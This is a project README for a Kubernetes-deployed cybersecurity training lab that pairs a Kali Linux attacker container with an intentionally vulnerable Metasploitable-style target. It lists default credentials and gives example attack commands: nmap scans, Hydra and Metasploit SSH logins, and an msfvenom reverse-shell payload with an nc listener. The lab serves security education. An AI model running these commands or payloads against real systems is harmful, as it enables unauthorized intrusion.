# VMS Cyber Master - Cybersecurity Lab Environment

## Project Overview

VMS Cyber Master is a comprehensive cybersecurity lab environment designed for educational purposes and authorized penetration testing practice. This project provides a containerized setup featuring:

- **Kali Linux Penetration Testing Platform**: A fully configured Kali Linux container with GUI access via VNC/noVNC, equipped with essential cybersecurity tools including Metasploit Framework, Nmap, and other penetration testing utilities.

- **Vulnerable Target System**: A Metasploitable2-inspired vulnerable system running on Ubuntu 20.04, configured with intentionally insecure services for educational exploitation practice.

- **Kubernetes Deployment**: Complete Kubernetes manifests for easy deployment and management of the lab environment in cloud or on-premises clusters.

**⚠️ IMPORTANT DISCLAIMER**: This lab environment is intended solely for educational purposes and authorized penetration testing. Only use these tools and vulnerable systems in controlled environments with explicit permission. Unauthorized access to computer systems is illegal.

## Architecture Explanation

The lab environment follows a client-server architecture with two main components:

### 1. Attacker Machine (Kali Linux)
- **Base Image**: `kalilinux/kali-rolling:latest`
- **GUI Access**: XFCE4 desktop environment accessible via VNC (port 5901) and web-based noVNC (port 6080)
- **Security Tools**: Pre-installed with Metasploit Framework, Nmap, and other essential penetration testing tools
- **Authentication**: VNC password protected (default: `kali12345`)

### 2. Target Machine (Metasploitable2-style)
- **Base Image**: `ubuntu:20.04` (ARM64 compatible)
- **Vulnerable Services**: Intentionally configured with weak credentials and insecure service configurations
- **Exposed Services**: SSH (22), HTTP (80), FTP (21), Telnet (23), SMTP (25), DNS (53), SMB (139/445), MySQL (3306), and others
- **Default Credentials**: root:toor, msfadmin:msfadmin

### 3. Kubernetes Orchestration
- **Namespace Isolation**: Dedicated `cyber-lab` namespace for environment separation
- **Service Exposure**: NodePort services for external access to both containers
- **Resource Management**: Configured resource limits and requests for optimal performance

### Network Architecture
```
[External Access] 
       |
[Kubernetes Cluster]
       |
[cyber-lab namespace]
    /     \
[Kali]   [Metasploitable]
  |           |
VNC:31001   SSH:31003
noVNC:31000 HTTP:31002
```

## File Structure with Descriptions

### Root Directory Files

#### `Dockerfile`
The main Dockerfile for building the Kali Linux penetration testing container. Key features:
- Installs XFCE4 desktop environment for GUI access
- Configures VNC server with password authentication
- Sets up noVNC for web-based remote access
- Installs essential penetration testing tools (Metasploit, Nmap, etc.)
- Configures X11 forwarding and display settings

#### `startup.sh`
Critical startup script for the Kali container that:
- Initializes X11 display server (Xvfb) on display :1
- Starts XFCE4 desktop environment
- Launches X11VNC server with authentication on port 5901
- Starts noVNC web proxy on port 6080
- Includes error checking and logging for troubleshooting
- Maintains container execution with log tailing

### DOckerFile-metaex/ Directory

#### `DOckerFile-metaex/Dockerfile`
Dockerfile for creating the vulnerable target system (Metasploitable2-style):
- Based on Ubuntu 20.04 for ARM64 compatibility
- Installs multiple vulnerable services (SSH, Apache, MySQL, FTP, Telnet, Samba, etc.)
- Configures intentionally weak security settings
- Creates vulnerable user accounts with default credentials
- Exposes multiple network services on various ports

#### `DOckerFile-metaex/start_services.sh`
Service initialization script for the vulnerable target that starts:
- SSH server (OpenSSH)
- Apache web server
- MySQL database server
- Xinetd super-server
- VSFTPD FTP server
- Samba file sharing
- BIND9 DNS server
- Postfix mail server

### Kubernetes Deployment Files

#### `namespace_ciber.yaml`
Creates the dedicated `cyber-lab` namespace for environment isolation and resource organization.

#### `kali-deploy.yaml`
Kubernetes Deployment manifest for the Kali Linux container:
- Configures resource limits (15Gi memory, 10 CPU cores, 20Gi ephemeral storage)
- Sets security context with privileged access for penetration testing tools
- Exposes VNC (5901) and noVNC (6080) ports
- Uses custom Kali image: `ocholoko888/kali-custom-vnc:latest`

#### `kali-service.yaml`
Kubernetes Service manifest for external access to Kali container:
- NodePort service type for external cluster access
- Port mappings: noVNC (31000) and VNC (31001)
- Routes traffic to the Kali deployment pods

#### `meta-deploy.yaml`
Kubernetes Deployment manifest for the Metasploitable target:
- Minimal resource requirements for vulnerable services
- Exposes HTTP (80) and SSH (22) ports
- Uses custom Metasploitable image: `ocholoko888/metasploitable2-arm64:latest`

#### `meta-service.yaml`
Kubernetes Service manifest for external access to Metasploitable container:
- NodePort service for external access
- Port mappings: HTTP (31002) and SSH (31003)
- Routes traffic to the Metasploitable deployment pods

## Prerequisites and Setup

### System Requirements

#### Hardware Requirements
- **Minimum**: 16GB RAM, 4 CPU cores, 50GB available storage
- **Recommended**: 32GB RAM, 8+ CPU cores, 100GB available storage
- **Architecture**: x86_64 or ARM64 compatible system

#### Software Requirements
- **Kubernetes Cluster**: v1.20+ (local or cloud-based)
  - Options: minikube, kind, k3s, or managed Kubernetes (EKS, GKE, AKS)
- **kubectl**: Kubernetes command-line tool
- **Container Runtime**: Docker, containerd, or CRI-O
- **VNC Viewer** (optional): For direct VNC access (TightVNC, RealVNC, etc.)

### Installation Steps

#### 1. Prepare Kubernetes Environment
```bash
# For local development with minikube
minikube start --memory=16384 --cpus=8 --disk-size=50g

# Verify cluster is running
kubectl cluster-info
```

#### 2. Deploy the Cyber Lab Environment
```bash
# Clone the repository
git clone https://github.com/PabloHurtadoGonzalo86/VMS_CIber_Master.git
cd VMS_CIber_Master

# Create the cyber-lab namespace
kubectl apply -f namespace_ciber.yaml

# Deploy Kali Linux penetration testing environment
kubectl apply -f kali-deploy.yaml
kubectl apply -f kali-service.yaml

# Deploy Metasploitable vulnerable target
kubectl apply -f meta-deploy.yaml
kubectl apply -f meta-service.yaml
```

#### 3. Verify Deployment
```bash
# Check pod status
kubectl get pods -n cyber-lab

# Check services
kubectl get services -n cyber-lab

# Get external access URLs (for minikube)
minikube service list -n cyber-lab
```

#### 4. Build Custom Images (Optional)
If you need to build the images locally:
```bash
# Build Kali Linux image
docker build -t kali-custom-vnc:latest .

# Build Metasploitable image
cd DOckerFile-metaex
docker build -t metasploitable2-arm64:latest .
```

### Network Configuration

#### Port Mappings
- **Kali noVNC Web Interface**: http://\<cluster-ip\>:31000
- **Kali VNC Direct Access**: \<cluster-ip\>:31001
- **Metasploitable Web Server**: http://\<cluster-ip\>:31002
- **Metasploitable SSH Access**: \<cluster-ip\>:31003

## Usage Examples

### Accessing the Kali Linux Environment

#### Web-based Access (Recommended)
1. Open a web browser and navigate to: `http://<cluster-ip>:31000`
2. Click "Connect" to access the noVNC interface
3. You'll be presented with the XFCE4 desktop environment
4. Open a terminal and start using penetration testing tools

#### Direct VNC Access
1. Use a VNC client to connect to: `<cluster-ip>:31001`
2. Enter the VNC password: `kali12345`
3. Access the full XFCE4 desktop environment

### Basic Penetration Testing Scenarios

#### 1. Network Discovery and Reconnaissance
```bash
# In the Kali container terminal, discover the target
nmap -sn 10.244.0.0/16  # Adjust network range based on your cluster

# Identify the Metasploitable target IP
nmap -sV -sC <metasploitable-ip>

# Example comprehensive scan
nmap -A -T4 <metasploitable-ip>
```

#### 2. Web Application Testing
```bash
# Access the vulnerable web application
# Browse to http://<cluster-ip>:31002 in Kali's web browser

# Use dirb for directory enumeration
dirb http://<metasploitable-ip>

# Use nikto for web vulnerability scanning
nikto -h http://<metasploitable-ip>
```

#### 3. SSH Brute Force Attack (Educational)
```bash
# Use Hydra for SSH brute force (educational purposes only)
hydra -l msfadmin -p msfadmin ssh://<metasploitable-ip>

# Use Metasploit for SSH login
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <metasploitable-ip>
set USERNAME msfadmin
set PASSWORD msfadmin
run
```

#### 4. Database Exploitation
```bash
# Connect to MySQL with default credentials
mysql -h <metasploitable-ip> -u root -ptoor

# Use Metasploit for MySQL enumeration
msfconsole
use auxiliary/scanner/mysql/mysql_version
set RHOSTS <metasploitable-ip>
run
```

#### 5. File Transfer and Payload Delivery
```bash
# Generate a test payload with msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=4444 -f elf > shell.elf

# Start a listener
nc -lvnp 4444

# Transfer and execute on target (if access obtained)
```

### Educational Lab Exercises

#### Beginner Level
1. **Network Scanning**: Use Nmap to discover services on the target
2. **Web Reconnaissance**: Explore the web application for vulnerabilities
3. **Service Enumeration**: Identify service versions and potential exploits

#### Intermediate Level
1. **Vulnerability Exploitation**: Exploit identified vulnerabilities using Metasploit
2. **Privilege Escalation**: Practice local privilege escalation techniques
3. **Post-Exploitation**: Explore file systems and gather information

#### Advanced Level
1. **Custom Exploit Development**: Write custom exploits for discovered vulnerabilities
2. **Persistence Mechanisms**: Implement backdoors and persistence methods
3. **Lateral Movement**: Simulate advanced persistent threat (APT) scenarios

### Troubleshooting Common Issues

#### Container Startup Problems
```bash
# Check pod logs
kubectl logs -n cyber-lab <pod-name>

# Describe pod for events
kubectl describe pod -n cyber-lab <pod-name>

# Check resource constraints
kubectl top pods -n cyber-lab
```

#### VNC Connection Issues
```bash
# Verify VNC service is running in Kali container
kubectl exec -n cyber-lab <kali-pod> -- ps aux | grep vnc

# Check port forwarding
kubectl port-forward -n cyber-lab <kali-pod> 6080:6080
```

#### Network Connectivity Problems
```bash
# Test connectivity between containers
kubectl exec -n cyber-lab <kali-pod> -- ping <metasploitable-ip>

# Check service endpoints
kubectl get endpoints -n cyber-lab
```

### Security Best Practices

1. **Isolated Environment**: Always run this lab in isolated networks
2. **Regular Updates**: Keep container images updated with security patches
3. **Access Control**: Implement proper RBAC for Kubernetes access
4. **Monitoring**: Log and monitor all activities for educational review
5. **Clean Shutdown**: Properly terminate sessions and clean up resources

### Legal and Ethical Considerations

- This environment is designed for **educational purposes only**
- Only use these tools in **controlled, authorized environments**
- Obtain **explicit permission** before testing any systems
- Follow your organization's **security policies and procedures**
- Report any **real vulnerabilities** discovered to appropriate parties
- Respect **privacy and confidentiality** of all data encountered

---

**Remember**: The knowledge gained from this lab should be used to improve security, not to cause harm. Always practice ethical hacking principles and respect legal boundaries.